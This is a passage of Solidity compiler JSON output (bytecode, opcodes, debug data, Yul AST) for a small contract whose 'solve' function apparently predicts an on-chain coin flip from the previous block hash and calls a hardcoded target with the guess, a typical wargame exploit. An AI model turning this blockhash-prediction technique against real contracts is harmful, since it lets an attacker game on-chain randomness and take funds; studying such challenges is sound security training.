\"#utility.yul\":2696:2702   */\n      dup4\n        /* \"#utility.yul\":2693:2694   */\n      dup2\n        /* \"#utility.yul\":2690:2703   */\n      gt\n        /* \"#utility.yul\":2687:2788   */\n      iszero\n      tag_76\n      jumpi\n        /* \"#utility.yul\":2776:2777   */\n      0x00\n        /* \"#utility.yul\":2767:2773   */\n      dup5\n        /* \"#utility.yul\":2762:2765   */\n      dup5\n        /* \"#utility.yul\":2758:2774   */\n      add\n        /* \"#utility.yul\":2751:2778   */\n      mstore\n        /* \"#utility.yul\":2687:2788   */\n    tag_76:\n        /* \"#utility.yul\":2536:2794   */\n      pop\n        /* \"#utility.yul\":2487:2794   */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2800:2980   */\n    tag_68:\n        /* \"#utility.yul\":2848:2925   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":2845:2846   */\n      0x00\n        /* \"#utility.yul\":2838:2926   */\n      mstore\n        /* \"#utility.yul\":2945:2949   */\n      0x11\n        /* \"#utility.yul\":2942:2943   */\n      0x04\n        /* \"#utility.yul\":2935:2950   */\n      mstore\n        /* \"#utility.yul\":2969:2973   */\n      0x24\n        /* \"#utility.yul\":2966:2967   */\n      0x00\n        /* \"#utility.yul\":2959:2974   */\n      revert\n        /* \"#utility.yul\":2986:3166   */\n    tag_62:\n        /* \"#utility.yul\":3034:3111   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":3031:3032   */\n      0x00\n        /* \"#utility.yul\":3024:3112   */\n      mstore\n        /* \"#utility.yul\":3131:3135   */\n      0x12\n        /* \"#utility.yul\":3128:3129   */\n      0x04\n        /* \"#utility.yul\":3121:3136   */\n      mstore\n        /* \"#utility.yul\":3155:3159   */\n      0x24\n        /* \"#utility.yul\":3152:3153   */\n      0x00\n        /* \"#utility.yul\":3145:3160   */\n      revert\n\n    auxdata: 0xa2646970667358221220763bcdd29619cd8c50ca8eb1660d4b82a5c8b69b1e33484f8508fefcad3b5c5664736f6c63430008070033\n}\n",
						"bytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"linkReferences": {},
							"object": "60806040527f800000000000000000000000000000000000000000000000000000000000000060005573ecd6671d91e677522f698c59b7b7f69a0682d975600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555034801561008957600080fd5b50610436806100996000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c8063890d690814610030575b600080fd5b61003861004e565b60405161004591906102b9565b60405180910390f35b60008060008054600143610062919061031b565b4060001c61007091906102ea565b119050801561014a57600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff167f1d263f678198afcb61494c86d0b849d04a869f89e604450ae1a549aa6619dd3d60016040516020016100e6929190610290565b6040516020818303038152906040526040516101029190610279565b600060405180830381855af49150503d806000811461013d576040519150601f19603f3d011682016040523d82523d6000602084013e610142565b606091505b505050610217565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff167f1d263f678198afcb61494c86d0b849d04a869f89e604450ae1a549aa6619dd3d60006040516020016101b7929190610290565b6040516020818303038152906040526040516101d39190610279565b600060405180830381855af49150503d806000811461020e576040519150601f19603f3d011682016040523d82523d6000602084013e610213565b606091505b5050505b5090565b6102248161034f565b82525050565b6102338161035b565b82525050565b6000610244826102d4565b61024e81856102df565b935061025e81856020860161036f565b80840191505092915050565b61027381610365565b82525050565b60006102858284610239565b915081905092915050565b60006040820190506102a5600083018561022a565b6102b2602083018461021b565b9392505050565b60006020820190506102ce600083018461026a565b92915050565b600081519050919050565b600081905092915050565b60006102f582610365565b915061030083610365565b9250826103105761030f6103d1565b5b828204905092915050565b600061032682610365565b915061033183610365565b925082821015610344576103436103a2565b5b828203905092915050565b60008115159050919050565b6000819050919050565b6000819050919050565b60005b8381101561038d578082015181840152602081019050610372565b8381111561039c576000848401525b50505050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fdfea2646970667358221220763bcdd29619cd8c50ca8eb1660d4b82a5c8b69b1e33484f8508fefcad3b5c5664736f6c63430008070033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH32 0x8000000000000000000000000000000000000000000000000000000000000000 PUSH1 0x0 SSTORE PUSH20 0xECD6671D91E677522F698C59B7B7F69A0682D975 PUSH1 0x1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP CALLVALUE DUP1 ISZERO PUSH2 0x89 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x436 DUP1 PUSH2 0x99 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x2B JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x890D6908 EQ PUSH2 0x30 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x38 PUSH2 0x4E JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x45 SWAP2 SWAP1 PUSH2 0x2B9 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP1 SLOAD PUSH1 0x1 NUMBER PUSH2 0x62 SWAP2 SWAP1 PUSH2 0x31B JUMP JUMPDEST BLOCKHASH PUSH1 0x0 SHR PUSH2 0x70 SWAP2 SWAP1 PUSH2 0x2EA JUMP JUMPDEST GT SWAP1 POP DUP1 ISZERO PUSH2 0x14A JUMPI PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x1D263F678198AFCB61494C86D0B849D04A869F89E604450AE1A549AA6619DD3D PUSH1 0x1 PUSH1 0x40 MLOAD PUSH1 0x20 ADD PUSH2 0xE6 SWAP3 SWAP2 SWAP1 PUSH2 0x290 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH1 0x40 MLOAD PUSH2 0x102 SWAP2 SWAP1 PUSH2 0x279 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 GAS DELEGATECALL SWAP2 POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x13D JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x142 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP POP PUSH2 0x217 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x1D263F678198AFCB61494C86D0B849D04A869F89E604450AE1A549AA6619DD3D PUSH1 0x0 PUSH1 0x40 MLOAD PUSH1 0x20 ADD PUSH2 0x1B7 SWAP3 SWAP2 SWAP1 PUSH2 0x290 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH1 0x40 MLOAD PUSH2 0x1D3 SWAP2 SWAP1 PUSH2 0x279 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 GAS DELEGATECALL SWAP2 POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x20E JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x213 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP POP JUMPDEST POP SWAP1 JUMP JUMPDEST PUSH2 0x224 DUP2 PUSH2 0x34F JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH2 0x233 DUP2 PUSH2 0x35B JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x244 DUP3 PUSH2 0x2D4 JUMP JUMPDEST PUSH2 0x24E DUP2 DUP6 PUSH2 0x2DF JUMP JUMPDEST SWAP4 POP PUSH2 0x25E DUP2 DUP6 PUSH1 0x20 DUP7 ADD PUSH2 0x36F JUMP JUMPDEST DUP1 DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x273 DUP2 PUSH2 0x365 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x285 DUP3 DUP5 PUSH2 0x239 JUMP JUMPDEST SWAP2 POP DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 DUP3 ADD SWAP1 POP PUSH2 0x2A5 PUSH1 0x0 DUP4 ADD DUP6 PUSH2 0x22A JUMP JUMPDEST PUSH2 0x2B2 PUSH1 0x20 DUP4 ADD DUP5 PUSH2 0x21B JUMP JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x2CE PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x26A JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x2F5 DUP3 PUSH2 0x365 JUMP JUMPDEST SWAP2 POP PUSH2 0x300 DUP4 PUSH2 0x365 JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0x310 JUMPI PUSH2 0x30F PUSH2 0x3D1 JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x326 DUP3 PUSH2 0x365 JUMP JUMPDEST SWAP2 POP PUSH2 0x331 DUP4 PUSH2 0x365 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 LT ISZERO PUSH2 0x344 JUMPI PUSH2 0x343 PUSH2 0x3A2 JUMP JUMPDEST JUMPDEST DUP3 DUP3 SUB SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x38D JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x372 JUMP JUMPDEST DUP4 DUP2 GT ISZERO PUSH2 0x39C JUMPI PUSH1 0x0 DUP5 DUP5 ADD MSTORE JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH23 0x3BCDD29619CD8C50CA8EB1660D4B82A5C8B69B1E33484F DUP6 ADDMOD INVALID 0xFC 0xAD EXTCODESIZE 0x5C JUMP PUSH5 0x736F6C6343 STOP ADDMOD SMOD STOP CALLER ",
							"sourceMap": "810:555:0:-:0;;;850:77;833:94;;957:42;934:65;;;;;;;;;;;;;;;;;;;;810:555;;;;;;;;;;;;;;;;"
						},
						"deployedBytecode": {
							"functionDebugData": {
								"@solve_137": {
									"entryPoint": 78,
									"id": 137,
									"parameterSlots": 0,
									"returnSlots": 1
								},
								"abi_encode_t_bool_to_t_bool_fromStack": {
									"entryPoint": 539,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 0
								},
								"abi_encode_t_bytes32_to_t_bytes32_fromStack": {
									"entryPoint": 554,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 0
								},
								"abi_encode_t_bytes_memory_ptr_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack": {
									"entryPoint": 569,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_encode_t_uint256_to_t_uint256_fromStack": {
									"entryPoint": 618,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 0
								},
								"abi_encode_tuple_packed_t_bytes_memory_ptr__to_t_bytes_memory_ptr__nonPadded_inplace_fromStack_reversed": {
									"entryPoint": 633,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_encode_tuple_t_bytes32_t_bool__to_t_bytes32_t_bool__fromStack_reversed": {
									"entryPoint": 656,
									"id": null,
									"parameterSlots": 3,
									"returnSlots": 1
								},
								"abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed": {
									"entryPoint": 697,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"array_length_t_bytes_memory_ptr": {
									"entryPoint": 724,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack": {
									"entryPoint": 735,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"checked_div_t_uint256": {
									"entryPoint": 746,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"checked_sub_t_uint256": {
									"entryPoint": 795,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"cleanup_t_bool": {
									"entryPoint": 847,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"cleanup_t_bytes32": {
									"entryPoint": 859,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"cleanup_t_uint256": {
									"entryPoint": 869,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"copy_memory_to_memory": {
									"entryPoint": 879,
									"id": null,
									"parameterSlots": 3,
									"returnSlots": 0
								},
								"panic_error_0x11": {
									"entryPoint": 930,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"panic_error_0x12": {
									"entryPoint": 977,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								}
							},
							"generatedSources": [
								{
									"ast": {
										"nodeType": "YulBlock",
										"src": "0:3169:1",
										"statements": [
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "66:50:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "83:3:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "103:5:1"
																			}
																		],
																		"functionName": {
																			"name": "cleanup_t_bool",
																			"nodeType": "YulIdentifier",
																			"src": "88:14:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "88:21:1"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "76:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "76:34:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "76:34:1"
														}
													]
												},
												"name": "abi_encode_t_bool_to_t_bool_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "54:5:1",
														"type": ""
													},
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "61:3:1",
														"type": ""
													}
												],
												"src": "7:109:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "187:53:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "204:3:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "227:5:1"
																			}
																		],
																		"functionName": {
																			"name": "cleanup_t_bytes32",
																			"nodeType": "YulIdentifier",
																			"src": "209:17:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "209:24:1"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "197:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "197:37:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "197:37:1"
														}
													]
												},
												"name": "abi_encode_t_bytes32_to_t_bytes32_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "175:5:1",
														"type": ""
													},
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "182:3:1",
														"type": ""
													}
												],
												"src": "122:118:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "354:265:1",
													"statements": [
														{
															"nodeType": "YulVariableDeclaration",
															"src": "364:52:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "410:5:1"
																	}
																],
																"functionName": {
																	"name": "array_length_t_bytes_memory_ptr",
																	"nodeType": "YulIdentifier",
																	"src": "378:31:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "378:38:1"
															},
															"variables": [
																{
																	"name": "length",
																	"nodeType": "YulTypedName",
																	"src": "368:6:1",
																	"type": ""
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "425:95:1",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "508:3:1"
																	},
																	{
																		"name": "length",
																		"nodeType": "YulIdentifier",
																		"src": "513:6:1"
																	}
																],
																"functionName": {
																	"name": "array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "432:75:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "432:88:1"
															},
															"variableNames": [
																{
																	"name": "pos",
																	"nodeType": "YulIdentifier",
																	"src": "425:3:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "555:5:1"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "562:4:1",
																				"type": "",
																				"value": "0x20"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "551:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "551:16:1"
																	},
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "569:3:1"
																	},
																	{
																		"name": "length",
																		"nodeType": "YulIdentifier",
																		"src": "574:6:1"
																	}
																],
																"functionName": {
																	"name": "copy_memory_to_memory",
																	"nodeType": "YulIdentifier",
																	"src": "529:21:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "529:52:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "529:52:1"
														},
														{
															"nodeType": "YulAssignment",
															"src": "590:23:1",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "601:3:1"
																	},
																	{
																		"name": "length",
																		"nodeType": "YulIdentifier",
																		"src": "606:6:1"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "597:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "597:16:1"
															},
															"variableNames": [
																{
																	"name": "end",
																	"nodeType": "YulIdentifier",
																	"src": "590:3:1"
																}
															]
														}
													]
												},
												"name": "abi_encode_t_bytes_memory_ptr_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "335:5:1",
														"type": ""
													},
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "342:3:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "350:3:1",
														"type": ""
													}
												],
												"src": "246:373:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "690:53:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "707:3:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "730:5:1"
																			}
																		],
																		"functionName": {
																			"name": "cleanup_t_uint256",
																			"nodeType": "YulIdentifier",
																			"src": "712:17:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "712:24:1"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "700:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "700:37:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "700:37:1"
														}
													]
												},
												"name": "abi_encode_t_uint256_to_t_uint256_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "678:5:1",
														"type": ""
													},
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "685:3:1",
														"type": ""
													}
												],
												"src": "625:118:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "883:137:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "894:100:1",
															"value": {
																"arguments": [
																	{
																		"name": "value0",
																		"nodeType": "YulIdentifier",
																		"src": "981:6:1"
																	},
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "990:3:1"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_bytes_memory_ptr_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "901:79:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "901:93:1"
															},
															"variableNames": [
																{
																	"name": "pos",
																	"nodeType": "YulIdentifier",
																	"src": "894:3:1"
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "1004:10:1",
															"value": {
																"name": "pos",
																"nodeType": "YulIdentifier",
																"src": "1011:3:1"
															},
															"variableNames": [
																{
																	"name": "end",
																	"nodeType": "YulIdentifier",
																	"src": "1004:3:1"
																}
															]
														}
													]
												},
												"name": "abi_encode_tuple_packed_t_bytes_memory_ptr__to_t_bytes_memory_ptr__nonPadded_inplace_fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "862:3:1",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "868:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "879:3:1",
														"type": ""
													}
												],
												"src": "749:271:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1146:200:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1156:26:1",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "1168:9:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1179:2:1",
																		"type": "",
																		"value": "64"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "1164:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1164:18:1"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "1156:4:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value0",
																		"nodeType": "YulIdentifier",
																		"src": "1236:6:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "1249:9:1"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "1260:1:1",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "1245:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1245:17:1"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_bytes32_to_t_bytes32_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "1192:43:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1192:71:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1192:71:1"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value1",
																		"nodeType": "YulIdentifier",
																		"src": "1311:6:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "1324:9:1"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "1335:2:1",
																				"type": "",
																				"value": "32"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "1320:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1320:18:1"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_bool_to_t_bool_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "1273:37:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1273:66:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1273:66:1"
														}
													]
												},
												"name": "abi_encode_tuple_t_bytes32_t_bool__to_t_bytes32_t_bool__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "1110:9:1",
														"type": ""
													},
													{
														"name": "value1",
														"nodeType": "YulTypedName",
														"src": "1122:6:1",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "1130:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "1141:4:1",
														"type": ""
													}
												],
												"src": "1026:320:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1450:124:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1460:26:1",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "1472:9:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1483:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "1468:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1468:18:1"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "1460:4:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value0",
																		"nodeType": "YulIdentifier",
																		"src": "1540:6:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "1553:9:1"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "1564:1:1",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "1549:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1549:17:1"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_uint256_to_t_uint256_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "1496:43:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1496:71:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1496:71:1"
														}
													]
												},
												"name": "abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "1422:9:1",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "1434:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "1445:4:1",
